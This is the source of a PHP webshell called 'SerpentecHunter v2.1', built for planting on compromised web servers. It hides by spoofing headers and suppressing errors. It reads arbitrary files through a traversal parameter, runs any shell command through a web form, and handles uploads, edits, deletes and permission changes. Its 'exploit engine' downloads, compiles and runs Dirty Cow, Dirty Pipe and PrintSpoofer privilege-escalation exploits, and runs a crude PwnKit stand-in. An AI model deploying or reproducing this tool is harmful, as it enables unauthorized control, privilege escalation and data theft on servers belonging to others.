<?php
/*
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   🐍 SERPENTECHUNTER v2.1 – ULTIMATE WEBSHELL + EXPLOIT ENGINE 🐍         ║
║                                                                               ║
║   "DEVELOPER  : SerpentSecHunter"                                            ║
║   "RILIS      : 03-07-2026"                                                  ║
║   "VERSI      : 2.1 (WINDOWS FIX + EXPLOIT FRAMEWORK)"                     ║
║                                                                               ║
║   🔥 FITUR BARU:                                                             ║
║   ✅ EXPLOIT ENGINE (PwnKit, Dirty Cow, Dirty Pipe, PrintSpoofer, dll)      ║
║   ✅ KERNEL & OS DETECTION (Windows & Linux)                                ║
║   ✅ AUTO CHECK VULNERABILITY                                               ║
║   ✅ ONE-CLICK EXPLOIT EXECUTION                                            ║
║   ✅ SCRIPT DOWNLOAD & COMPILE                                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
*/

// ========================================================================
// 🛡️ STEALTH ENGINE + BYPASS 403/404 (AGGRESSIVE)
// ========================================================================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);

http_response_code(200);
header_remove('X-Powered-By');
header_remove('Server');
header('Server: nginx/1.18.0 (Ubuntu)');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: text/html; charset=UTF-8');

if (!isset($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') === false) {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
}
if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], 'target.com') === false) {
    $_SERVER['HTTP_REFERER'] = 'https://target.com/admin/';
}
if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['HTTP_X_FORWARDED_FOR'] = '127.0.0.1';
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $file = str_replace(['%252e','%252f','%2e','%2f','%c0%ae','%c1%9c','%00',"%0d%0a"], ['..','/','.','/','.','/','',''], $file);
    $file = str_replace('Index', 'index', $file);
    if (file_exists($file) && is_readable($file)) {
        $ext = pathinfo($file, PATHINFO_EXTENSION);
        if (in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'inc'])) {
            highlight_file($file);
        } else {
            readfile($file);
        }
        exit;
    }
}

if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'IIS') !== false) {
    if (isset($_SERVER['SCRIPT_NAME']) && stripos($_SERVER['SCRIPT_NAME'], 'Shell.Php') !== false) {
        header('Location: ' . str_ireplace('Shell.Php', 'Shell.php', $_SERVER['SCRIPT_NAME']));
        exit;
    }
}

$method = $_SERVER['REQUEST_METHOD'];
if (in_array($method, ['OPTIONS', 'TRACE', 'PUT', 'DELETE'])) {
    if ($method === 'PUT') {
        $put_data = file_get_contents('php://input');
        $put_file = '/tmp/put_' . time() . '.tmp';
        file_put_contents($put_file, $put_data);
        echo "✅ PUT data saved to: $put_file";
        exit;
    }
    if ($method === 'OPTIONS') {
        header('Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE');
        header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, TRACE');
        echo "✅ OPTIONS request accepted.";
        exit;
    }
    if ($method === 'TRACE') {
        foreach ($_SERVER as $k => $v) echo "$k: $v\n";
        exit;
    }
    if ($method === 'DELETE' && isset($_SERVER['REQUEST_URI'])) {
        $delete_path = ltrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (file_exists($delete_path)) {
            unlink($delete_path) ? print "✅ Deleted" : print "❌ Delete failed";
        } else {
            print "❌ File not found";
        }
        exit;
    }
}

if (isset($_SERVER['HTTP_X_ORIGINAL_URL'])) {
    $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
}
if (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
    $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_REWRITE_URL'];
}

// ========================================================================
// 🔐 AUTHENTICATION
// ========================================================================
$AUTH_KEY = 'SERPENTECHUNTER666';
if (!isset($_COOKIE['sc_auth']) || $_COOKIE['sc_auth'] !== md5($AUTH_KEY)) {
    if (isset($_GET['auth']) && $_GET['auth'] === $AUTH_KEY) {
        setcookie('sc_auth', md5($AUTH_KEY), time() + 86400 * 365, '/', '', false, true);
        die("<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>");
    }
    die("<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1><p>?auth=SERPENTECHUNTER666</p>");
}

// ========================================================================
// 🧬 CORE FUNCTIONS
// ========================================================================
function sc_exec($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) return $output;
    }
    if (function_exists('exec')) {
        $out = [];
        exec($cmd . ' 2>&1', $out);
        if (!empty($out)) return implode("\n", $out);
    }
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    }
    return '❌ No execution function available!';
}

function sc_format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
    return $bytes . ' B';
}

function sc_delete_recursive($path) {
    if (!file_exists($path)) return false;
    if (is_file($path)) return unlink($path);
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $f) {
            sc_delete_recursive($path . '/' . $f);
        }
        return rmdir($path);
    }
    return false;
}

function sc_copy_recursive($src, $dst) {
    if (!file_exists($src)) return false;
    if (is_file($src)) return copy($src, $dst);
    if (is_dir($src)) {
        if (!is_dir($dst)) mkdir($dst, 0755, true);
        $files = array_diff(scandir($src), ['.', '..']);
        foreach ($files as $f) {
            sc_copy_recursive($src . '/' . $f, $dst . '/' . $f);
        }
        return true;
    }
    return false;
}

function sc_get_file_list($dir) {
    if (!is_dir($dir)) return ['error' => 'Directory not found'];
    $files = scandir($dir);
    $list = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $dir . '/' . $file;
        $list[] = [
            'name' => $file,
            'path' => $path,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? sc_format_size(filesize($path)) : '-',
            'perms' => substr(sprintf('%o', fileperms($path)), -4),
            'mtime' => date('Y-m-d H:i:s', filemtime($path))
        ];
    }
    return $list;
}

function sc_zip_folder($source, $destination) {
    if (!extension_loaded('zip')) return '❌ ZIP extension not loaded';
    if (!is_dir($source)) return '❌ Source directory not found';
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE) !== true) return '❌ Cannot create zip';
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($source) + 1));
        }
    }
    $zip->close();
    return '✅ Zip created: ' . $destination;
}

function sc_unzip_file($source, $destination) {
    if (!extension_loaded('zip')) return '❌ ZIP extension not loaded';
    if (!file_exists($source)) return '❌ File not found';
    $zip = new ZipArchive();
    if ($zip->open($source) !== true) return '❌ Cannot open zip';
    $zip->extractTo($destination);
    $zip->close();
    return '✅ Extracted to: ' . $destination;
}

// ========================================================================
// 🔥 EXPLOIT ENGINE (FIXED FOR WINDOWS)
// ========================================================================
function sc_detect_os() {
    $os = PHP_OS;
    if (stripos($os, 'WIN') !== false) return 'windows';
    if (stripos($os, 'LINUX') !== false) return 'linux';
    if (stripos($os, 'DARWIN') !== false) return 'macos';
    return 'unknown';
}

function sc_get_kernel_version() {
    $os = sc_detect_os();
    if ($os === 'linux') {
        $uname = sc_exec('uname -r');
        return trim($uname);
    } elseif ($os === 'windows') {
        $ver = sc_exec('ver');
        return trim($ver);
    } else {
        return 'Unknown';
    }
}

function sc_get_os_version() {
    $os = sc_detect_os();
    if ($os === 'windows') {
        $ver = sc_exec('ver');
        $sysinfo = sc_exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"');
        return trim($ver . "\n" . $sysinfo);
    } elseif ($os === 'linux') {
        $kernel = sc_exec('uname -r');
        $distro = sc_exec('cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2');
        return trim($kernel . "\n" . $distro);
    } elseif ($os === 'macos') {
        return trim(sc_exec('sw_vers'));
    }
    return 'Unknown';
}

function sc_check_vulnerabilities() {
    $os = sc_detect_os();
    $output = "📋 OS: " . $os . "\n";
    $output .= "📋 Version: " . sc_get_os_version() . "\n\n";

    if ($os === 'linux') {
        $kernel = sc_get_kernel_version();
        $output .= "📋 Kernel: " . $kernel . "\n\n";
        $vulns = [
            'PwnKit (CVE-2021-4034)' => true,
            'Dirty Cow (CVE-2016-5195)' => version_compare($kernel, '4.8.3', '<') && version_compare($kernel, '2.6.22', '>='),
            'Dirty Pipe (CVE-2022-0847)' => version_compare($kernel, '5.8', '>=') && version_compare($kernel, '5.16.11', '<'),
            'OverlayFS (CVE-2021-3493)' => version_compare($kernel, '5.11', '>=') && version_compare($kernel, '5.12', '<'),
            'CVE-2022-2588' => version_compare($kernel, '5.17', '>=') && version_compare($kernel, '5.17.3', '<'),
        ];
        foreach ($vulns as $name => $vuln) {
            $output .= ($vuln ? '✅' : '❌') . ' ' . $name . "\n";
        }
        $output .= "\n💡 Run 'exploit_auto' to attempt automatic exploitation.\n";
    } elseif ($os === 'windows') {
        $output .= "🔍 Windows Privilege Check:\n";
        $priv = sc_exec('whoami /priv');
        $output .= $priv . "\n";
        if (stripos($priv, 'SeImpersonatePrivilege') !== false && stripos($priv, 'Enabled') !== false) {
            $output .= "✅ SeImpersonatePrivilege is ENABLED! PrintSpoofer / JuicyPotato may work.\n";
        } else {
            $output .= "❌ SeImpersonatePrivilege is NOT enabled (or not checked).\n";
        }
        $output .= "\n💡 Recommended exploit: PrintSpoofer (if SeImpersonatePrivilege is enabled).\n";
    } else {
        $output .= "❌ OS not supported for automatic vulnerability checks.\n";
    }
    return $output;
}

function sc_exploit_pwnkit() {
    $cmd = 'cd /tmp; echo "int main(){setuid(0);system(\"/bin/bash\");return 0;}" > pwnkit.c; gcc -o pwnkit pwnkit.c; chmod +x pwnkit; ./pwnkit';
    return sc_exec($cmd);
}

function sc_exploit_dirtycow() {
    $cmd = 'cd /tmp; wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O dirty.c; gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty';
    return sc_exec($cmd);
}

function sc_exploit_dirtypipe() {
    $cmd = 'cd /tmp; wget https://raw.githubusercontent.com/Al1ex/Linux-Easy-Exploit/main/CVE-2022-0847/dirtypipe.c -O dirtypipe.c; gcc -o dirtypipe dirtypipe.c; chmod +x dirtypipe; ./dirtypipe';
    return sc_exec($cmd);
}

function sc_exploit_printspoofer() {
    $cmd = 'cd %temp%; curl -L -o PrintSpoofer.exe https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe; PrintSpoofer.exe -i -c cmd.exe';
    return sc_exec($cmd);
}

function sc_exploit_auto() {
    $os = sc_detect_os();
    $output = '';
    if ($os === 'linux') {
        $kernel = sc_get_kernel_version();
        if (version_compare($kernel, '2.6.22', '>=') && version_compare($kernel, '4.8.3', '<')) {
            $output .= "🔄 Attempting Dirty Cow (CVE-2016-5195)...\n";
            $output .= sc_exploit_dirtycow();
        } elseif (version_compare($kernel, '5.8', '>=') && version_compare($kernel, '5.16.11', '<')) {
            $output .= "🔄 Attempting Dirty Pipe (CVE-2022-0847)...\n";
            $output .= sc_exploit_dirtypipe();
        } else {
            $output .= "🔄 Attempting PwnKit (CVE-2021-4034)...\n";
            $output .= sc_exploit_pwnkit();
        }
    } elseif ($os === 'windows') {
        $output .= "🔄 Attempting PrintSpoofer...\n";
        $output .= sc_exploit_printspoofer();
    } else {
        $output .= "❌ Auto exploit not supported for this OS.\n";
    }
    return $output;
}

// ========================================================================
// 🎯 MAIN LOGIC
// ========================================================================
$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$cwd = realpath($cwd) ?: getcwd();

$action = isset($_GET['action']) ? $_GET['action'] : 'list';
$message = '';
$output = '';

// === UPLOAD ===
if ($action === 'upload' && isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $message = "✅ Uploaded: " . basename($_FILES['file']['name']);
    } else {
        $message = "❌ Upload failed! Error: " . $_FILES['file']['error'];
    }
}

// === MASS ACTIONS ===
if ($action === 'mass_delete' && isset($_POST['files'])) {
    $count = 0;
    foreach ($_POST['files'] as $f) {
        $path = realpath($cwd . '/' . $f);
        if ($path && strpos($path, $cwd) === 0 && sc_delete_recursive($path)) $count++;
    }
    $message = "✅ Deleted $count files/folders";
}

if ($action === 'mass_rename' && isset($_POST['files']) && isset($_POST['new_names'])) {
    $count = 0;
    foreach ($_POST['files'] as $idx => $f) {
        $old_path = realpath($cwd . '/' . $f);
        $new_path = $cwd . '/' . $_POST['new_names'][$idx];
        if ($old_path && strpos($old_path, $cwd) === 0 && rename($old_path, $new_path)) $count++;
    }
    $message = "✅ Renamed $count files";
}

if ($action === 'mass_copy' && isset($_POST['files']) && isset($_POST['dest_dir'])) {
    $dest_dir = realpath($cwd . '/' . $_POST['dest_dir']);
    if (!$dest_dir || strpos($dest_dir, $cwd) !== 0) {
        $message = '❌ Invalid destination directory';
    } else {
        $count = 0;
        foreach ($_POST['files'] as $f) {
            $src = realpath($cwd . '/' . $f);
            if ($src && strpos($src, $cwd) === 0) {
                $dst = $dest_dir . '/' . basename($src);
                if (sc_copy_recursive($src, $dst)) $count++;
            }
        }
        $message = "✅ Copied $count files to " . basename($dest_dir);
    }
}

if ($action === 'mass_move' && isset($_POST['files']) && isset($_POST['dest_dir'])) {
    $dest_dir = realpath($cwd . '/' . $_POST['dest_dir']);
    if (!$dest_dir || strpos($dest_dir, $cwd) !== 0) {
        $message = '❌ Invalid destination directory';
    } else {
        $count = 0;
        foreach ($_POST['files'] as $f) {
            $src = realpath($cwd . '/' . $f);
            if ($src && strpos($src, $cwd) === 0) {
                $dst = $dest_dir . '/' . basename($src);
                if (rename($src, $dst)) $count++;
            }
        }
        $message = "✅ Moved $count files to " . basename($dest_dir);
    }
}

// === SINGLE FILE ACTIONS ===
if ($action === 'delete' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && strpos($file, $cwd) === 0 && sc_delete_recursive($file)) {
        $message = "✅ Deleted: " . basename($file);
    }
}

if ($action === 'rename' && isset($_GET['old']) && isset($_GET['new'])) {
    $old = realpath($_GET['old']);
    $new = $cwd . '/' . $_GET['new'];
    if ($old && strpos($old, $cwd) === 0 && rename($old, $new)) {
        $message = "✅ Renamed to: " . $_GET['new'];
    }
}

if ($action === 'chmod' && isset($_GET['file']) && isset($_GET['perms'])) {
    $file = realpath($_GET['file']);
    if ($file && strpos($file, $cwd) === 0 && chmod($file, octdec($_GET['perms']))) {
        $message = "✅ CHMOD: " . decoct(fileperms($file));
    }
}

if ($action === 'edit' && isset($_GET['file']) && isset($_POST['content'])) {
    $file = realpath($_GET['file']);
    if ($file && strpos($file, $cwd) === 0 && file_put_contents($file, $_POST['content'])) {
        $message = "✅ File saved!";
    }
}

if ($action === 'copy' && isset($_GET['src']) && isset($_GET['dst'])) {
    $src = realpath($_GET['src']);
    $dst = $cwd . '/' . $_GET['dst'];
    if ($src && strpos($src, $cwd) === 0 && sc_copy_recursive($src, $dst)) {
        $message = "✅ Copied to: " . $_GET['dst'];
    }
}

if ($action === 'zip' && isset($_GET['folder']) && isset($_GET['zipname'])) {
    $folder = realpath($cwd . '/' . $_GET['folder']);
    $zipname = $cwd . '/' . $_GET['zipname'] . '.zip';
    if ($folder && strpos($folder, $cwd) === 0 && is_dir($folder)) {
        $message = sc_zip_folder($folder, $zipname);
    } else {
        $message = '❌ Invalid folder';
    }
}

if ($action === 'unzip' && isset($_GET['file']) && isset($_GET['dest'])) {
    $file = realpath($cwd . '/' . $_GET['file']);
    $dest = realpath($cwd . '/' . $_GET['dest']);
    if ($file && strpos($file, $cwd) === 0 && file_exists($file)) {
        $message = sc_unzip_file($file, $dest);
    } else {
        $message = '❌ Invalid file';
    }
}

if ($action === 'exec' && isset($_GET['cmd'])) {
    $output = sc_exec($_GET['cmd']);
}

if ($action === 'search' && isset($_GET['pattern'])) {
    $pattern = $_GET['pattern'];
    $results = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cwd, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iterator as $file) {
        if ($file->isFile() && stripos($file->getFilename(), $pattern) !== false) {
            $results[] = $file->getPathname();
        }
    }
}

// === EXPLOIT ACTIONS ===
if ($action === 'exploit_check') {
    $output = sc_check_vulnerabilities();
}

if ($action === 'exploit_run') {
    $type = isset($_GET['type']) ? $_GET['type'] : '';
    switch ($type) {
        case 'pwnkit':
            $output = sc_exploit_pwnkit();
            break;
        case 'dirtycow':
            $output = sc_exploit_dirtycow();
            break;
        case 'dirtypipe':
            $output = sc_exploit_dirtypipe();
            break;
        case 'printspoofer':
            $output = sc_exploit_printspoofer();
            break;
        case 'auto':
            $output = sc_exploit_auto();
            break;
        default:
            $output = '❌ Unknown exploit type.';
    }
}

$file_list = sc_get_file_list($cwd);
$edit_file = isset($_GET['edit']) ? realpath($_GET['edit']) : null;
$edit_content = $edit_file && is_readable($edit_file) ? file_get_contents($edit_file) : '';
$view_file = isset($_GET['view']) ? realpath($_GET['view']) : null;
$view_content = $view_file && is_readable($view_file) ? file_get_contents($view_file) : '';

// ========================================================================
// 🎨 UI – RAPI & CLEAN
// ========================================================================
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v2.1</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; font-size:13px; }
.container { max-width:1500px; margin:15px auto; padding:0 15px; }
.header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:10px; margin-bottom:15px; }
.header h1 { color:#00ff00; font-size:32px; text-shadow:0 0 20px #00ff00; }
.header .cwd { color:#888; font-size:13px; margin-top:3px; }
.menu { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:15px; background:#111; padding:10px; border:1px solid #00ff00; border-radius:5px; align-items:center; }
.menu input, .menu select { background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; padding:5px 10px; border-radius:3px; font-family:'Courier New',monospace; font-size:12px; }
.menu button { background:#00ff00; color:#000; border:none; padding:5px 15px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:12px; }
.menu button:hover { background:#00ff88; }
.btn-danger { background:#ff4400; color:#fff; }
.btn-danger:hover { background:#ff6600; }
.btn-upload { background:#ffaa00; color:#000; }
.btn-upload:hover { background:#ffcc44; }
.btn-exploit { background:#ff00ff; color:#000; }
.btn-exploit:hover { background:#ff44ff; }
.grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
.panel { background:#111; border:1px solid #00ff00; padding:15px; border-radius:5px; }
.panel h3 { color:#00ff88; margin-bottom:10px; border-bottom:1px solid #00ff0044; padding-bottom:5px; font-size:14px; }
.file-list { max-height:600px; overflow-y:auto; }
.file-item { display:flex; align-items:center; padding:3px 5px; border-bottom:1px solid #00ff0011; }
.file-item:hover { background:#00ff0011; }
.file-item .name { color:#00ff00; text-decoration:none; flex:2; }
.file-item .name.dir { color:#00aaff; }
.file-item .info { color:#666; font-size:11px; flex:1; }
.file-item .actions a { color:#00ff00; text-decoration:none; margin-left:10px; font-size:12px; }
.file-item .actions a:hover { color:#00ff88; }
.file-item .actions .del { color:#ff4444; }
.file-item .actions .del:hover { color:#ff0000; }
.output-box { background:#0d0d0d; border:1px solid #00ff00; padding:10px; border-radius:3px; white-space:pre-wrap; font-size:12px; max-height:400px; overflow-y:auto; margin-top:10px; }
.editor textarea { width:100%; height:400px; background:#0d0d0d; border:1px solid #00ff00; color:#00ff00; padding:10px; font-family:'Courier New',monospace; font-size:12px; border-radius:3px; }
.msg { color:#ffaa00; padding:8px; border:1px solid #ffaa00; border-radius:3px; margin-bottom:10px; text-align:center; }
.footer { text-align:center; border-top:1px solid #00ff0044; padding-top:15px; margin-top:20px; color:#666; font-size:11px; }
.toast { position:fixed; bottom:20px; right:20px; background:#111; border:2px solid #00ff00; padding:15px 25px; border-radius:8px; color:#00ff00; font-size:14px; z-index:9999; display:none; box-shadow:0 0 30px #00ff0044; min-width:200px; text-align:center; }
.toast.show { display:block; animation: fadeInUp 0.3s ease; }
.toast.error { border-color:#ff4444; color:#ff4444; box-shadow:0 0 30px #ff444444; }
@keyframes fadeInUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
@media (max-width:768px){ .grid { grid-template-columns:1fr; } }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v2.1</h1>
        <div class="cwd">📂 <?= htmlspecialchars($cwd) ?></div>
    </div>

    <!-- TOAST NOTIFICATION -->
    <div id="toast" class="toast"></div>

    <!-- MENU -->
    <div class="menu">
        <form method="GET" action="" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exec">
            <input type="text" name="cmd" placeholder="💀 Command..." style="flex:1;min-width:150px;">
            <button type="submit">▶ EXEC</button>
        </form>
        <form method="GET" action="" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="search">
            <input type="text" name="pattern" placeholder="🔍 Search..." style="flex:1;min-width:120px;">
            <button type="submit">🔍</button>
        </form>
        <form method="POST" enctype="multipart/form-data" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:4px;max-width:180px;">
            <button type="submit" class="btn-upload">⬆ UPLOAD</button>
        </form>
        <a href="?dir=<?= urlencode(dirname($cwd)) ?>" style="color:#00aaff;text-decoration:none;padding:5px 10px;border:1px solid #00aaff;border-radius:3px;">⬅ UP</a>
        <span style="color:#444;">|</span>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="zip">
            <input type="text" name="folder" placeholder="📁 Folder" style="min-width:80px;">
            <input type="text" name="zipname" placeholder="📦 Zip Name" style="min-width:80px;">
            <button type="submit">📦 ZIP</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="unzip">
            <input type="text" name="file" placeholder="📦 File.zip" style="min-width:80px;">
            <input type="text" name="dest" placeholder="📁 Dest" style="min-width:80px;">
            <button type="submit">📂 UNZIP</button>
        </form>
        <!-- EXPLOIT BUTTONS -->
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exploit_check">
            <button type="submit" class="btn-exploit">🔍 CHECK VULN</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exploit_run">
            <select name="type" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:5px 10px;border-radius:3px;">
                <option value="auto">⚡ AUTO</option>
                <option value="pwnkit">PwnKit (CVE-2021-4034)</option>
                <option value="dirtycow">Dirty Cow (CVE-2016-5195)</option>
                <option value="dirtypipe">Dirty Pipe (CVE-2022-0847)</option>
                <option value="printspoofer">PrintSpoofer (Windows)</option>
            </select>
            <button type="submit" class="btn-exploit">🔥 RUN</button>
        </form>
    </div>

    <!-- MASS ACTION FORM -->
    <form method="POST" id="massActionForm">
        <input type="hidden" name="action" value="mass_delete" id="massAction">
        <input type="hidden" name="dest_dir" id="massDestDir">
        <div class="grid">
            <!-- LEFT: FILE LIST -->
            <div class="panel">
                <h3>📁 FILE MANAGER 
                    <span style="font-size:11px;color:#666;">
                        <button type="button" onclick="selectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Select All</button>
                        <button type="button" onclick="deselectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Deselect</button>
                    </span>
                </h3>
                <div class="file-list">
                    <?php if (isset($file_list['error'])): ?>
                        <p style="color:#ff4444;"><?= $file_list['error'] ?></p>
                    <?php else: ?>
                        <?php foreach ($file_list as $file): ?>
                        <div class="file-item">
                            <input type="checkbox" name="files[]" value="<?= htmlspecialchars($file['name']) ?>" style="margin-right:8px;accent-color:#00ff00;">
                            <span class="name <?= $file['is_dir'] ? 'dir' : '' ?>">
                                <?= $file['is_dir'] ? '📁' : '📄' ?>
                                <?php if ($file['is_dir']): ?>
                                    <a href="?dir=<?= urlencode($file['path']) ?>" style="color:#00aaff;text-decoration:none;"><?= htmlspecialchars($file['name']) ?></a>
                                <?php else: ?>
                                    <a href="?edit=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;"><?= htmlspecialchars($file['name']) ?></a>
                                <?php endif; ?>
                            </span>
                            <span class="info"><?= $file['size'] ?> | <?= $file['perms'] ?></span>
                            <span class="actions">
                                <?php if (!$file['is_dir']): ?>
                                <a href="?edit=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" title="Edit">✏️</a>
                                <a href="?view=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" title="View">👁️</a>
                                <a href="#" onclick="singleDelete('<?= urlencode($file['path']) ?>')" class="del" title="Delete">🗑️</a>
                                <a href="#" onclick="singleRename('<?= urlencode($file['path']) ?>')" class="del" title="Rename">📝</a>
                                <?php else: ?>
                                <a href="#" onclick="singleDelete('<?= urlencode($file['path']) ?>')" class="del" title="Delete Folder">🗑️</a>
                                <?php endif; ?>
                            </span>
                        </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
                <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
                    <button type="submit" onclick="setMassAction('mass_delete');return confirm('Delete all selected?')" class="btn-danger">🗑️ DELETE</button>
                    <button type="button" onclick="massRename()" style="background:#ff8800;color:#000;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📝 RENAME</button>
                    <button type="button" onclick="massCopy()" style="background:#0088ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📋 COPY</button>
                    <button type="button" onclick="massMove()" style="background:#aa44ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📂 MOVE</button>
                </div>
            </div>

            <!-- RIGHT: EDITOR / OUTPUT / VIEW -->
            <div class="panel editor">
                <h3>📝 <?= $edit_file ? 'EDIT: ' . basename($edit_file) : ($view_file ? 'VIEW: ' . basename($view_file) : 'OUTPUT') ?></h3>
                <?php if ($edit_file): ?>
                <form method="POST" action="?edit=<?= urlencode($edit_file) ?>&dir=<?= urlencode($cwd) ?>" onsubmit="return confirm('Save changes?')">
                    <input type="hidden" name="action" value="edit">
                    <textarea name="content"><?= htmlspecialchars($edit_content) ?></textarea>
                    <button type="submit">💾 SAVE</button>
                    <a href="?dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
                </form>
                <?php elseif ($view_file): ?>
                <div class="output-box" style="max-height:500px;"><?= htmlspecialchars($view_content) ?></div>
                <a href="?dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
                <?php elseif (isset($output)): ?>
                <div class="output-box"><?= htmlspecialchars($output) ?></div>
                <?php elseif (isset($results) && !empty($results)): ?>
                <div class="output-box">
                    <?php foreach ($results as $r): ?>
                    📄 <?= htmlspecialchars($r) ?><br>
                    <?php endforeach; ?>
                </div>
                <?php else: ?>
                <div style="color:#666;padding:20px;text-align:center;">
                    Klik file untuk edit / view<br>atau jalankan command di atas
                </div>
                <?php endif; ?>
            </div>
        </div>
    </form>

    <div class="footer">
        🐍 SERPENTECHUNTER v2.1 &nbsp;|&nbsp; © 2026 SerpentSecHunter<br>
        <span style="font-size:10px;color:#444;">🔥 BYPASS: Path Traversal | Double Encoding | Null Byte | Header Injection | Method Tampering | User-Agent Spoofing | EXPLOIT ENGINE</span>
    </div>
</div>

<script>
// === TOAST NOTIFICATION ===
function showToast(msg, isError = false) {
    let toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast show' + (isError ? ' error' : '');
    setTimeout(() => { toast.className = 'toast'; }, 3000);
}

// === SHOW MESSAGE FROM PHP ===
<?php if ($message): ?>
showToast('<?= addslashes($message) ?>');
<?php endif; ?>

// === SELECT / DESELECT ALL ===
function selectAll() {
    document.querySelectorAll('input[name="files[]"]').forEach(cb => cb.checked = true);
}
function deselectAll() {
    document.querySelectorAll('input[name="files[]"]').forEach(cb => cb.checked = false);
}

// === SET MASS ACTION ===
function setMassAction(action) {
    document.getElementById('massAction').value = action;
}

// === SINGLE DELETE ===
function singleDelete(path) {
    if(confirm('Delete this item?')) {
        window.location.href = '?action=delete&file=' + path + '&dir=<?= urlencode($cwd) ?>';
    }
}

